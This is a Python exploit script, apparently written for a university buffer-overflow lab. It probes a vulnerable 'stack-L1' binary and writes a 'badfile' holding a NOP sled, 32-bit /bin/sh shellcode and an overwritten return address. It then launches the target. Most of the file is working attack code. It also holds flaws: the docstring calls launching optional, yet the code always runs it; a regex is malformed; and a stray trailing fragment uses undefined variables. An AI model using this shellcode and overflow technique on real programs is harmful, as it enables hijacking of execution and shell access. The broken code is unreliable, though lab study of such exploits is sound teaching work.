#!/usr/bin/env python3
"""
exploit.py -- Probe addresses from the target's own printouts, then craft
a unique badfile (with email/SID/random note) and optionally launch the target.

Usage:
    python3 exploit.py --email alice@wsu.edu --sid 2025xxxx --note "my unique note"
By default this script writes a 'badfile' in the current directory and exits.
Use --launch to exec the target binary after writing badfile (use with care).
"""
import os
import re
import secrets
import argparse
import hashlib
import subprocess
import sys
import time

BADFILE_SIZE = 517
START = 20           # shellcode start index inside buffer (< BUF_SIZE)
RET_BIAS = 16        # land the RET inside the NOP sled before shellcode
ADDR_LEN = 4         # 32-bit

# 32-bit Linux /bin/sh shellcode (no null bytes)
SHELLCODE = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    b"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    b"\xd2\x31\xc0\xb0\x0b\xcd\x80"
)


def probe_addresses(binpath="./stack-L1", timeout=5):
    """Run the target with PROBE=1 and parse BUF and OFFSET. Returns (buf_addr, offset, raw_output)."""
    env = os.environ.copy()
    env["PROBE"] = "1"
    try:
        out = subprocess.check_output([binpath], env=env, stderr=subprocess.STDOUT, timeout=timeout)
        out = out.decode("utf-8", "replace")
    except subprocess.CalledProcessError as e:
        raise RuntimeError(f"Target exited with non-zero status: {e.returncode}\nOutput:\n{e.output.decode('utf-8', 'replace')}")
    except FileNotFoundError:
        raise RuntimeError(f"Target binary not found: {binpath}")
    except subprocess.TimeoutExpired:
        raise RuntimeError("Target timed out while probing addresses")

    # More robust regex: allow newlines and whitespace between fields
    m = re.search(r"BUF=0x([0-9a-fA-F]+).*OFFSET=0x([0-9a-fA-F]+", out, re.S | re.M)
    if not m:
        raise RuntimeError("Could not parse BUF/OFFSET from output:\n" + out)
    buf_addr = int(m.group(1), 16)
    offset = int(m.group(2), 16)
    return buf_addr, offset, out.strip()


def build_unique_meta(email, sid, note):
    rand = secrets.token_hex(8)

    def clean(s):
        return "".join(ch for ch in s if 32 <= ord(ch) < 127)

    meta = f"EML={clean(email)};SID={clean(sid)};NOTE={clean(note)};RAND={rand};"
    return meta.encode("ascii", "ignore")


def craft_badfile(buf_addr, offset, email, sid, note, outpath="badfile"):
    # Validation
    if offset < 0:
        raise ValueError(f"OFFSET is negative ({offset}); cannot write RET to badfile. "
                         "Check target output or rebuild target to print signed offsets.")

    if START + len(SHELLCODE) > BADFILE_SIZE:
        raise ValueError("SHELLCODE + START does not fit inside BADFILE_SIZE")
    if not (0 <= offset <= BADFILE_SIZE - ADDR_LEN):
        raise ValueError(f"OFFSET {offset} out of range for badfile size {BADFILE_SIZE}")

    content = bytearray([0x90] * BADFILE_SIZE)  # NOP sled
    # Place shellcode
    content[START: START + len(SHELLCODE)] = SHELLCODE

    # Choose a RET that lands inside the sled; the sled will slide into shellcode.
    ret = buf_addr + START + RET_BIAS

    
    try:
        content[offset: offset + ADDR_LEN] = ret.to_bytes(4, "little")
    except Exception as e:
        raise RuntimeError(f"Failed to write RET to offset slice: {e}")

    
    meta = build_unique_meta(email, sid, note)
  
    max_meta_start = BADFILE_SIZE - len(meta)
    if max_meta_start < 0:
        meta = meta[:BADFILE_SIZE - 1]
        max_meta_start = BADFILE_SIZE - len(meta)

    tail_idx = min(max(offset + ADDR_LEN + 8, 0), max_meta_start)
    content[tail_idx: tail_idx + len(meta)] = meta

    stamp = time.strftime("%Y%m%dT%H%M%S")
    safe_out = f"{outpath}.{stamp}"
    with open(safe_out, "wb") as f:
        f.write(content)

    sha256 = hashlib.sha256(content).hexdigest()
    return ret, sha256, meta.decode("ascii", "ignore"), safe_out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--email", required=True, help="student email")
    ap.add_argument("--sid", required=True, help="student id")
    ap.add_argument("--note", required=True, help="short note to personalize")
    ap.add_argument("--bin", default="./stack-L1", help="target binary")
    ap.add_argument("--launch", action="store_true", help="after writing badfile, exec target (use with care)")
    args = ap.parse_args()

    buf_addr, offset, raw = probe_addresses(args.bin)
    print("[+] Probe output (truncated):")
    for line in raw.splitlines()[:10]:
        print("    ", line)
    print(f"[+] Parsed BUF=0x{buf_addr:08x}, OFFSET={offset}")

    ret, sha256, meta, path = craft_badfile(buf_addr, offset, args.email, args.sid, args.note)
    print(f"[+] RET=0x{ret:08x}")
    print(f"[+] badfile written to: {path}")
    print(f"[+] badfile SHA256 = {sha256}")
    print(f"[+] META = {meta}")

    print("\n[=] Launching target (use with care)...")
    os.execv(args.bin, [args.bin])
    

if __name__ == "__main__":
    main()

offset_signed = retloc_addr - buf_addr
# For clarity, produce distance and direction
if offset_signed < 0:
    print(f"[!] RETLOC (0x{retloc_addr:08x}) is BEFORE BUF (0x{buf_addr:08x}) by {-offset_signed} bytes.")
    raise RuntimeError("Saved return address is at a lower address than the buffer; "
                       "simple forward overflow cannot overwrite RET. Aborting.")
offset = int(offset_signed)  # non-negative integer if we get here


